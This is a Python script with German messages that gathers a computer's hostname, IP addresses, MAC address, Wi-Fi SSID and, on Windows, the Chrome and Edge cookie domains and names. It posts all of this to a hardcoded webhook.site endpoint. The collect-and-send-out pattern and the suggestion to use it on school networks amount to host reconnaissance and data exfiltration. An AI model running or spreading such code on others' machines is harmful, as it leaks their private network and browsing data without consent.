#!/usr/bin/env python3
"""PC Info Script (minimal dependencies, standard library only)

Features:
- Hostname
- Private IP (best-effort)
- Public IP (HTTPS)
- MAC address (best-effort)
- Wi‑Fi info (SSID + interface; best-effort, OS-specific)
- Cookies viewer (Chrome & Edge, Windows): domains + cookie names (NO values)
- Prints to console
- Saves everything to pc_info.txt
- Sends TEXT (not file) to webhook.site via HTTP POST

Notes:
- Uses ONLY Python standard library
- webhook.site is ideal for school/VPN networks and debugging

Run:
  python pc_info.py

Tests:
  python pc_info.py --selftest
"""

from __future__ import annotations

import os
import socket
import uuid
import subprocess
import urllib.request
import urllib.error
import sys
import sqlite3
from collections import defaultdict
from typing import Dict, List

# -----------------
# CONFIG
# -----------------
WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"


# -----------------
# DATA COLLECTION
# -----------------

def get_hostname() -> str:
    return socket.gethostname()


def get_private_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # UDP connect doesn't send packets; OS picks outbound interface.
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        try:
            return socket.gethostbyname(socket.gethostname())
        except OSError:
            return "unbekannt"
    finally:
        try:
            s.close()
        except Exception:
            pass


def get_public_ip(timeout: float = 5.0) -> str:
    urls = ["https://api.ipify.org", "https://checkip.amazonaws.com"]
    for url in urls:
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return r.read().decode("utf-8", errors="replace").strip()
        except Exception:
            pass
    return "unbekannt"


def get_mac_address() -> str:
    mac = uuid.getnode()
    # If multicast bit set, uuid.getnode() likely returned a random MAC.
    if (mac >> 40) & 1:
        return "unbekannt"
    return ":".join(f"{(mac >> i) & 0xFF:02x}" for i in range(40, -1, -8))


def run_cmd(cmd: List[str]) -> str:
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace")
    except Exception:
        return ""


def get_wifi_info() -> Dict[str, str]:
    info = {"interface": "unbekannt", "ssid": "unbekannt"}

    if sys.platform.startswith("win"):
        raw = run_cmd(["netsh", "wlan", "show", "interfaces"])
        for line in raw.splitlines():
            s = line.strip()
            if s.startswith("Name") and ":" in s:
                info["interface"] = s.split(":", 1)[1].strip()
            if s.startswith("SSID") and "BSSID" not in s and ":" in s:
                info["ssid"] = s.split(":", 1)[1].strip()

    elif sys.platform.startswith("linux"):
        ssid = run_cmd(["iwgetid", "-r"]).strip()
        if ssid:
            info["ssid"] = ssid
            out = run_cmd(["iwgetid"]).strip()
            if out:
                info["interface"] = out.split()[0]

    elif sys.platform == "darwin":
        airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        raw = run_cmd([airport, "-I"])
        for line in raw.splitlines():
            if " SSID:" in line:
                info["ssid"] = line.split(":", 1)[1].strip()
        info["interface"] = "en0"

    return info


# -----------------
# COOKIES (VIEWER – SAFE, READ‑ONLY)
# -----------------
# NOTE: We intentionally DO NOT read cookie values.
# We only list domains and cookie names/counts for easy viewing.


def _cookie_db_paths_windows() -> Dict[str, str]:
    base = os.path.expandvars(r"%LOCALAPPDATA%")
    return {
        "Chrome": os.path.join(base, r"Google\Chrome\User Data\Default\Network\Cookies"),
        "Edge": os.path.join(base, r"Microsoft\Edge\User Data\Default\Network\Cookies"),
    }


def read_cookies_overview() -> List[str]:
    lines: List[str] = []

    if not sys.platform.startswith("win"):
        return ["Cookies:", "  (Nur Windows unterstützt)"]

    lines.append("Cookies (Übersicht – ohne Werte):")

    for browser, path in _cookie_db_paths_windows().items():
        lines.append(f"{browser}:")

        if not os.path.exists(path):
            lines.append("  (nicht gefunden)")
            continue

        # Copy DB to avoid locking issues
        tmp = path + ".tmp"
        try:
            with open(path, "rb") as src, open(tmp, "wb") as dst:
                dst.write(src.read())
        except Exception:
            lines.append("  (konnte Datenbank nicht lesen)")
            continue

        domain_map: Dict[str, List[str]] = defaultdict(list)
        con = None
        try:
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            cur.execute("SELECT host_key, name FROM cookies")
            for host, name in cur.fetchall():
                domain_map[str(host)].append(str(name))
        except Exception:
            lines.append("  (Fehler beim Lesen der Cookies)")
        finally:
            try:
                if con is not None:
                    con.close()
            except Exception:
                pass
            try:
                os.remove(tmp)
            except Exception:
                pass

        if not domain_map:
            lines.append("  (keine Cookies gefunden)")
            continue

        for domain in sorted(domain_map.keys()):
            names = domain_map[domain]
            lines.append(f"  {domain} ({len(names)} Cookies)")
            for n in sorted(names)[:5]:
                lines.append(f"    - {n}")
            if len(names) > 5:
                lines.append("    - …")

    return lines


# -----------------
# OUTPUT
# -----------------

def build_lines() -> List[str]:
    wifi = get_wifi_info()
    lines: List[str] = [
        f"PC-Name (Hostname): {get_hostname()}",
        f"Private IP: {get_private_ip()}",
        f"Public IP: {get_public_ip()}",
        f"MAC-Adresse: {get_mac_address()}",
        "WLAN:",
        f"  Interface: {wifi['interface']}",
        f"  SSID: {wifi['ssid']}",
        "",
    ]
    lines.extend(read_cookies_overview())
    return lines


def save_txt(lines: List[str], filename: str = "pc_info.txt") -> None:
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def send_text_to_webhook(url: str, lines: List[str]) -> None:
    data = "\n".join(lines).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "text/plain; charset=utf-8"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        _ = resp.read()


# -----------------
# MAIN
# -----------------

def main() -> int:
    lines = build_lines()

    for l in lines:
        print(l)

    try:
        save_txt(lines)
        print("\nGespeichert in pc_info.txt")
    except OSError as e:
        print(f"\n[FEHLER] Konnte pc_info.txt nicht speichern: {e}")
        return 3

    try:
        send_text_to_webhook(WEBHOOK_SITE_URL, lines)
        print("[OK] Text wurde an webhook.site gesendet.")
    except urllib.error.URLError as e:
        print(f"[FEHLER] Netzwerk/DNS Fehler beim Senden: {e}")
        return 1
    except Exception as e:
        print(f"[FEHLER] Senden fehlgeschlagen: {e}")
        return 2

    return 0


# -----------------
# TESTS
# -----------------

def _selftest() -> int:
    import unittest
    import tempfile

    class TestPCInfo(unittest.TestCase):
        def test_save_txt_writes_expected(self):
            with tempfile.TemporaryDirectory() as d:
                p = os.path.join(d, "pc_info.txt")
                save_txt(["a", "b"], p)
                with open(p, "r", encoding="utf-8") as f:
                    self.assertEqual(f.read(), "a\nb")

        def test_build_lines_contains_headers(self):
            lines = build_lines()
            self.assertTrue(any(x.startswith("PC-Name") for x in lines))
            self.assertIn("WLAN:", lines)

        def test_send_text_to_webhook_bad_url_raises(self):
            # This should raise URLError because host is invalid.
            with self.assertRaises(Exception):
                send_text_to_webhook("https://invalid.invalid/", ["x"])

    suite = unittest.defaultTestLoader.loadTestsFromTestCase(TestPCInfo)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    return 0 if result.wasSuccessful() else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        raise SystemExit(_selftest())

    code = main()

    if os.name == "nt":
        try:
            input("\nEnter drücken zum Beenden...")
        except EOFError:
            pass

    raise SystemExit(code)

